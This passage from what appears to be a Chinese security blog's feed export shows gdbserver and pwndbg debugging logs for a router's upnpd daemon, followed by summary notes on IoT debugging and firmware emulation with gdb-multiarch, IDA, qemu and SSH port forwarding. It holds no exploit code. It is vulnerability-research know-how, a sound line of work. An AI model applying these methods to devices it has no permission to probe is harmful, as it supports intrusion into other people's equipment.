class="line">sigchld_handler</span><br><span class="line">my_waitpid (17556, 0x0): status(9), 17556</span><br><span class="line">Hit a non-gdbserver <span class="built_in">trap</span> event.</span><br><span class="line">wait_for_sigstop: LWP 17555 already stopped</span><br><span class="line">Checking whether LWP 17555 needs to move out of the jump pad...no</span><br><span class="line">linux_wait ret = LWP 17555.17555, 1, 5</span><br><span class="line">Listening on port 1234</span><br><span class="line">handling possible accept event</span><br><span class="line">Remote debugging from host 192.168.10.2</span><br><span class="line">linux_async (0), previous=0</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">linux_async (0), previous=0</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">wait_for_sigstop: LWP 17555 already stopped</span><br><span class="line">Checking whether LWP 17555 needs to move out of the jump pad...no</span><br><span class="line">Writing resume reply <span class="keyword">for</span> LWP 17555.17555:1</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">Trying host libthread_db library: libthread_db.so.1.</span><br><span class="line">Segmentation fault</span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">17799 admin      2492 S   upnpd-62</span><br><span class="line">17867 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62</span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>–remote-debug</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">18053 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 --remote-debug :1234 upnpd-62</span></span><br><span class="line">Process upnpd-62 created; pid = 18108</span><br><span class="line">Listening on port 1234</span><br><span class="line">Remote debugging from host 192.168.10.2</span><br><span class="line">[getpkt: discarding char <span class="string">'+'</span>]</span><br><span class="line">getpkt (<span class="string">"qSupported:multiprocess+;swbreak+;hwbreak+;qRelocInsn+;fork-events+;vfork-events+;exec-events+;vContSupported+;QThreadEvents+;no-resumed+;xmlRegisters=i386"</span>);  [sending ack]</span><br><span class="line">[sent ack]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$PacketSize</span>=3fff;QPassSignals+;QProgramSignals+;qXfer:libraries-svr4:read+;augmented-libraries-svr4-read+;qXfer:auxv:read+;qXfer:spu:read+;qXfer:spu:write+;qXfer:siginfo:read+;qXfer:siginfo:write+;qXfer:features:read+;QStartNoAckMode+;qXfer:osdata:read+;multiprocess+;QNonStop+;QDisableRandomization+;qXfer:threads:read+;ConditionalBreakpoints+;BreakpointCommands+;QAgent+#4f"</span>); [looking <span class="keyword">for</span> ack]</span><br><span class="line">[received <span class="string">'+'</span> (0x2b)]</span><br><span class="line">getpkt (<span class="string">"vMustReplyEmpty"</span>);  [sending ack]</span><br><span class="line">[sent ack]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$#00</span>"</span>); [looking <span class="keyword">for</span> ack]</span><br><span class="line">[received <span class="string">'+'</span> (0x2b)]</span><br><span class="line">getpkt (<span class="string">"QStartNoAckMode"</span>);  [sending ack]</span><br><span class="line">[sent ack]</span><br><span class="line">[noack mode enabled]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">[getpkt: discarding char <span class="string">'+'</span>]</span><br><span class="line">getpkt (<span class="string">"QProgramSignals:0;1;3;4;6;7;8;9;c;f;10;11;12;13;14;15;16;17;18;19;1a;1b;1c;1d;1e;1f;20;21;22;23;24;25;26;27;28;29;2a;2b;2c;2d;2e;2f;30;31;32;33;34;35;36;37;38;39;3a;3b;3c;3d;3e;3f;40;41;42;43;44;45;46;47;48;49;4a;4b;4c;4d;4e;4f;50;51;52;53;54;55;56;57;58;59;5a;5b;5c;5d;5e;5f;60;61;62;63;64;65;66;67;68;69;6a;6b;6c;6d;6e;6f;70;71;72;73;74;75;76;77;78;79;7a;7b;7c;7d;7e;7f;80;81;82;83;84;85;86;87;88;89;8a;8b;8c;8d;8e;8f;90;91;92;93;94;95;96;97;98;99;9a;"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"Hgp0.0"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:features:read:target.xml:0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;target&gt;&lt;architecture&gt;arm&lt;/architecture&gt;&lt;/target&gt;#06"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"QNonStop:0"</span>);  [no ack sent]</span><br><span class="line">[all-stop mode enabled]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qTStatus"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$#00</span>"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"?"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$T050b</span>:0*"</span>00;0d:b0deffbe;0f:30f90a40;thread:p46bc.46bc;core:0;<span class="comment">#cc"); [noack mode]</span></span><br><span class="line">getpkt (<span class="string">"qXfer:threads:read::0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;threads&gt;</span></span><br><span class="line"><span class="string">&lt;thread id="</span>p46bc.46bc<span class="string">" core="</span>0<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">&lt;/threads&gt;</span></span><br><span class="line"><span class="string">#88"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qAttached:46bc"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$0</span>#30"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"Hc-1"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$E01</span>#a6"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qOffsets"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$#00</span>"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:libraries-svr4:read::0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;library-list-svr4 version="</span>1.0<span class="string">"/&gt;#e5"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:auxv:read::0,1000"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:libraries-svr4:read::0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;library-list-svr4 version="</span>1.0<span class="string">"/&gt;#e5"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qSymbol::"</span>);  [no ack sent]</span><br><span class="line">Segmentation fault</span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">18311 admin      2492 S   upnpd-62</span><br><span class="line">18423 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62</span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>远程调试：gdbserver附加进程//here（同上</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 :1234 --attach 18792</span></span><br><span class="line">Attached; pid = 18792</span><br><span class="line">Listening on port 1234</span><br><span class="line">Remote debugging from host 192.168.10.2</span><br><span class="line">Segmentation fault</span><br><span class="line"></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62</span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">warning: .dynamic section <span class="keyword">for</span> <span class="string">"./squashfs-root/usr/lib/libnvram.so"</span> is not at the expected address (wrong library or version mismatch?)</span><br><span class="line">warning: .dynamic section <span class="keyword">for</span> <span class="string">"./squashfs-root/usr/lib/libacos_shared.so"</span> is not at the expected address (wrong library or version mismatch?)</span><br><span class="line">Reading symbols from ./squashfs-root/usr/lib/libnvram.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/usr/lib/libnvram.so:</span><br><span class="line">Remote connection closed</span><br><span class="line">Reading symbols from ./squashfs-root/usr/lib/libacos_shared.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/usr/lib/libnat.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libcrypt.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libgcc_s.so.1...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libm.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>补丁对比</tag>
      </tags>
  </entry>
  <entry>
    <title>iot设备动态调试-总结</title>
    <url>/2021/03/31/iot/iot%E8%AE%BE%E5%A4%87%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="iot设备动态调试-总结"><a href="#iot设备动态调试-总结" class="headerlink" title="iot设备动态调试-总结"></a>iot设备动态调试-总结</h1><h1 id="linux-server-ida"><a href="#linux-server-ida" class="headerlink" title="linux_server+ida"></a>linux_server+ida</h1><p><a href="https://blog.csdn.net/abc_670/article/details/80066817" target="_blank" rel="noopener">https://blog.csdn.net/abc_670/article/details/80066817</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/zld<span class="comment"># ./linux_server </span></span><br><span class="line">IDA Linux 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br><span class="line"></span><br><span class="line">ida： 300BDQ1C0.bin ./unzip.mips -f compress.img -D out</span><br></pre></td></tr></table></figure>
<h1 id="gdbserver-gdb-ida"><a href="#gdbserver-gdb-ida" class="headerlink" title="gdbserver+gdb/ida"></a>gdbserver+gdb/ida</h1><ul>
<li>获取进程ID：ps|grep -v grep |grep netns |awk ‘{print $1}’</li>
<li>启动gdbserver：./gdbserver-7.7.1-armhf-eabi5-v1-sysv :1234 –attach <code>ps|grep -v grep |grep upnpd |awk &#39;{print $1}&#39;</code>（前者调试端口，后者进程ID，冒号前有空格</li>
<li>也可以不附加直接启动：/home/gdbserver.arm6.8 :1234 /home/Sofia_unpack</li>
<li>Ubuntu：gdb-multiarch usr/sbin/upnpd、target remote 10.10.10.2:1234</li>
<li>ida也可</li>
</ul>
<h1 id="qemu作为gdbserver"><a href="#qemu作为gdbserver" class="headerlink" title="qemu作为gdbserver"></a>qemu作为gdbserver</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ ls</span><br><span class="line">1_var_Sofia  bin  boot  dev  etc  home  lib  linuxrc  mnt  opt  proc  qemu-arm-static  root  sbin  share  slv  sys  usr  var</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ sudo chroot . ./qemu-arm-static -g 1234 1_var_Sofia </span><br><span class="line">HTTPD: fd: 6, IP: 0x18ea8c0</span><br></pre></td></tr></table></figure>
<h1 id="gdb-gdbserver"><a href="#gdb-gdbserver" class="headerlink" title="gdb+gdbserver"></a>gdb+gdbserver</h1><p><a href="https://mp.weixin.qq.com/s/VL0FNkndDKdYcoVF6-libg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/VL0FNkndDKdYcoVF6-libg</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="配置gdb-multiarch"><a href="#配置gdb-multiarch" class="headerlink" title="配置gdb-multiarch"></a>配置gdb-multiarch</h1><ul>
<li><p>安装：sudo apt install gdb-multiarch</p>
</li>
<li><p>pwngdb：<a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">https://github.com/pwndbg/pwndbg</a></p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br><span class="line"><span class="comment"># 成功后，～/.gdbinit</span></span><br><span class="line"><span class="built_in">source</span> /home/lxl/tools/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure>
<ul>
<li>gef：<a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">https://github.com/hugsy/gef</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 成功后，～/.gdbinit</span></span><br><span class="line"><span class="built_in">source</span> /home/lxl/.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
<ul>
<li>切换二者：～/.gdbinit中另一个注释掉即可</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#source /home/lxl/.gdbinit-gef.py</span></span><br><span class="line"><span class="built_in">source</span> /home/lxl/tools/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure>
<h1 id="寻找适合的的gdb-server版本-here"><a href="#寻找适合的的gdb-server版本-here" class="headerlink" title="寻找适合的的gdb/server版本//here"></a>寻找适合的的gdb/server版本//here</h1><ul>
<li>arm类型太多，怎么找？</li>
</ul>
<h1 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h1><h1 id="gdb-multiarch使用"><a href="#gdb-multiarch使用" class="headerlink" title="gdb-multiarch使用"></a>gdb-multiarch使用</h1><ul>
<li>pwndbp与gef，一个不行就换另一个，总是会有莫名其妙的错误</li>
<li><p>gdb-gef指令显示失败，多是条件跳转语句，无视，直接ni即可</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[!] Command <span class="string">'context'</span> failed to execute properly, reason: </span><br><span class="line">0x100aef74 <span class="keyword">in</span> ?? ()</span><br><span class="line">.text:100AEF74                 beqz    <span class="variable">$v0</span>, loc_100AEF9C</span><br><span class="line"></span><br><span class="line">[!] Command <span class="string">'context'</span> failed to execute properly, reason: </span><br><span class="line">0x100aefb8 <span class="keyword">in</span> ?? ()</span><br><span class="line">.text:100AEFB8                 beqz    <span class="variable">$v0</span>, loc_100AF028</span><br></pre></td></tr></table></figure>
</li>
<li><p>一般步骤</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./gdbserver.mips64r2_octeon2_x64_static_6.8 --attach :1234 `./busybox-mips64 pidof webs`</span><br><span class="line"></span><br><span class="line">gef➤  <span class="built_in">set</span> architecture mips</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">gef➤  <span class="built_in">set</span> sysroot ./</span><br><span class="line">gef➤  file bin/webs </span><br><span class="line">Reading symbols from bin/webs...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gef➤  b *0x100AED6C</span><br><span class="line">Breakpoint 1 at 0x100aed6c</span><br><span class="line">gef➤  target remote 192.168.1.1:1234</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
</li>
<li><p>动态库没导入</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gef➤  target remote 192.168.100.1:1234</span><br><span class="line">Remote debugging using 192.168.100.1:1234</span><br><span class="line">warning: Could not load shared library symbols <span class="keyword">for</span> /uclibc/lib/libc.so.0.</span><br><span class="line">Do you need <span class="string">"set solib-search-path"</span> or <span class="string">"set sysroot"</span>?</span><br><span class="line"></span><br><span class="line">gef➤  i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line">0x2abb3ff0  0x2abe2e50  Yes (*)     ./uclibc/lib/libcm.so</span><br><span class="line">0x2acf3c30  0x2ad04770  Yes (*)     ./uclibc/lib/libgcc_s.so.1</span><br><span class="line">                        No          /uclibc/lib/libc.so.0</span><br><span class="line">0x2aaa89f0  0x2aaac310  Yes (*)     ./uclibc/lib/ld-uClibc.so.0</span><br><span class="line">(*): Shared library is missing debugging information.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原因：是链接文件，并且找不到最终指向</span></span><br><span class="line">/squashfs-root$ ls uclibc/lib/libc.so.0 -l</span><br><span class="line">lrwxr-xr-x 1 501 dialout 19 Jul 20 10:45 uclibc/lib/libc.so.0 -&gt; libuClibc-0.9.28.so</span><br><span class="line">/squashfs-root$ find ./ -name <span class="string">"libuClibc-0.9.28.so"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 并非搜索路径问题</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>动态库搜索路径</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 相关指令</span></span><br><span class="line"><span class="built_in">set</span> solib-search-path</span><br><span class="line"><span class="built_in">set</span> sysroot（即<span class="built_in">set</span> solib-absolute-prefix</span><br><span class="line">info sharedlibrary</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">https://blog.csdn.net/_xiao/article/details/23289971、https://www.cntofu.com/book/46/gdb/solib-absolute-prefix_he_solib_-_search_-_path_de_.md</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mac、ssh（源、目的、中间</span></span><br><span class="line">ssh -L 9000:192.168.100.2:80 root@192.168.142.182</span><br><span class="line">http://127.0.0.1:9000</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Windows、xshell</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/qq_34039315/article/details/77510923</span></span><br><span class="line"><span class="comment"># 右键属性、隧道、添加、类型是本地（拔出）</span></span><br><span class="line"><span class="comment"># 通过此中间主机，将目标转到源</span></span><br><span class="line">源主机：localhost</span><br><span class="line">侦听端口：9000</span><br><span class="line">目标主机：192.168.100.2</span><br><span class="line">目标端口：80</span><br></pre></td></tr></table></figure>
<h2 id="linux-server-ida-1"><a href="#linux-server-ida-1" class="headerlink" title="linux_server+ida"></a>linux_server+ida</h2><p><a href="https://blog.csdn.net/abc_670/article/details/80066817" target="_blank" rel="noopener">https://blog.csdn.net/abc_670/article/details/80066817</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/zld<span class="comment"># ./linux_server </span></span><br><span class="line">IDA Linux 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br><span class="line"></span><br><span class="line">ida： 300BDQ1C0.bin ./unzip.mips -f compress.img -D out</span><br></pre></td></tr></table></figure>
<h2 id="gdbserver-gdb-ida-1"><a href="#gdbserver-gdb-ida-1" class="headerlink" title="gdbserver+gdb/ida"></a>gdbserver+gdb/ida</h2><ul>
<li>获取进程ID：ps|grep -v grep |grep netns |awk ‘{print $1}’</li>
<li>启动gdbserver：./gdbserver-7.7.1-armhf-eabi5-v1-sysv :1234 –attach <code>ps|grep -v grep |grep upnpd |awk &#39;{print $1}&#39;</code>（前者调试端口，后者进程ID，冒号前有空格</li>
<li>也可以不附加直接启动：/home/gdbserver.arm6.8 :1234 /home/Sofia_unpack</li>
<li>Ubuntu：gdb-multiarch usr/sbin/upnpd、target remote 10.10.10.2:1234</li>
<li>ida也可</li>
</ul>
<h2 id="qemu作为gdbserver-1"><a href="#qemu作为gdbserver-1" class="headerlink" title="qemu作为gdbserver"></a>qemu作为gdbserver</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ ls</span><br><span class="line">1_var_Sofia  bin  boot  dev  etc  home  lib  linuxrc  mnt  opt  proc  qemu-arm-static  root  sbin  share  slv  sys  usr  var</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ sudo chroot . ./qemu-arm-static -g 1234 1_var_Sofia </span><br><span class="line">HTTPD: fd: 6, IP: 0x18ea8c0</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>iot设备固件模拟-总结</title>
    <url>/2021/03/30/iot/iot%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F-%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="iot设备固件模拟-总结"><a href="#iot设备固件模拟-总结" class="headerlink" title="iot设备固件模拟-总结"></a>iot设备固件模拟-总结</h1><h1 id="01-qemu-system"><a href="#01-qemu-system" class="headerlink" title="01-qemu-system"></a>01-qemu-system</h1><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><ul>
<li>所需文件</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内核、硬盘、</span></span><br><span class="line">/arm_qemu  ls</span><br><span class="line">debian_wheezy_armhf_standard.qcow2 </span><br><span class="line">initrd.img-3.2.0-4-vexpress        </span><br><span class="line">run.sh                             </span><br><span class="line">vmlinuz-3.2.0-4-vexpress</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动脚本</span></span><br><span class="line">/arm_qemu  cat run.sh</span><br><span class="line">qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载地址</span></span><br><span class="line">https://people.debian.org/~aurel32/qemu/armel/</span><br></pre></td></tr></table></figure>
<ul>
<li>步骤</li>
</ul>
